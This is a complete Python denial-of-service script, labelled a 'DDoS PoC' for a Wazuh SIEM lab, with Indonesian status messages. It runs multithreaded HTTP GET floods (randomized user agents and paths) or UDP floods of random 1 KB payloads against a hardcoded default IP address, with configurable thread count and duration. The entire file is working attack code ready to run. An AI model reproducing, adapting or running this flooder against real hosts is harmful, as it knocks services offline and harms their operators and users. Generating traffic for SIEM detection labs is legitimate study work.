#!/usr/bin/env python3
import socket, threading, time, random, argparse, sys
from datetime import datetime

DEFAULT_TARGET = "70.153.137.47"
DEFAULT_PORT = 80
DEFAULT_THREADS = 100
DEFAULT_DURATION = 30

packets_sent = 0
requests_sent = 0
lock = threading.Lock()
stop_event = threading.Event()

def log(msg, level="INFO"):
    timestamp = datetime.now().strftime("%H:%M:%S")
    print(f"[{timestamp}] [{level}] {msg}")

def http_flood_worker(target, port):
    global requests_sent
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (X11; Linux x86_64)",
    ]
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            ua = random.choice(user_agents)
            paths = ["/", "/index.html", "/login", "/api/data"]
            path = random.choice(paths)
            request = (f"GET {path} HTTP/1.1\r\nHost: {target}\r\n"
                      f"User-Agent: {ua}\r\nConnection: keep-alive\r\n\r\n")
            s.send(request.encode())
            s.close()
            with lock:
                requests_sent += 1
        except:
            pass

def udp_flood_worker(target, port):
    global packets_sent
    payload = random._urandom(1024)
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(payload, (target, port))
            s.close()
            with lock:
                packets_sent += 1
        except:
            pass

def run_attack(attack_type, target, port, num_threads, duration):
    workers = {
        "http": (http_flood_worker, "HTTP Flood"),
        "udp": (udp_flood_worker, "UDP Flood"),
    }
    worker_func, attack_name = workers[attack_type]
    log(f"Memulai {attack_name} | Target: {target}:{port} | Threads: {num_threads} | Duration: {duration}s", "WARNING")
    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=worker_func, args=(target, port), daemon=True)
        t.start()
        threads.append(t)
    log(f"{num_threads} threads aktif — attack berjalan...", "INFO")
    start_time = time.time()
    try:
        while time.time() - start_time < duration:
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            print(f"\r  Elapsed: {elapsed}s | Remaining: {remaining}s | "
                  f"Requests/Packets: {requests_sent + packets_sent:,}    ", end="", flush=True)
            time.sleep(0.5)
    except KeyboardInterrupt:
        log("\nDihentikan oleh user", "WARNING")
    finally:
        stop_event.set()
        print()
    elapsed_total = int(time.time() - start_time)
    log(f"Attack selesai! Total: {requests_sent + packets_sent:,} | Duration: {elapsed_total}s", "INFO")

def main():
    parser = argparse.ArgumentParser(description="DDoS PoC — Wazuh SIEM Lab")
    parser.add_argument("-t", "--target", default=DEFAULT_TARGET)
    parser.add_argument("-p", "--port", type=int, default=DEFAULT_PORT)
    parser.add_argument("-n", "--threads", type=int, default=DEFAULT_THREADS)
    parser.add_argument("-d", "--duration", type=int, default=DEFAULT_DURATION)
    parser.add_argument("-a", "--attack", default="http", choices=["http", "udp"])
    args = parser.parse_args()
    print(f"\n  Target: {args.target}:{args.port} | Attack: {args.attack.upper()} | Threads: {args.threads} | Duration: {args.duration}s\n")
    confirm = input("  Lanjutkan? (yes/no): ").strip().lower()
    if confirm != "yes":
        sys.exit(0)
    run_attack(args.attack, args.target, args.port, args.threads, args.duration)

if __name__ == "__main__":
    main()
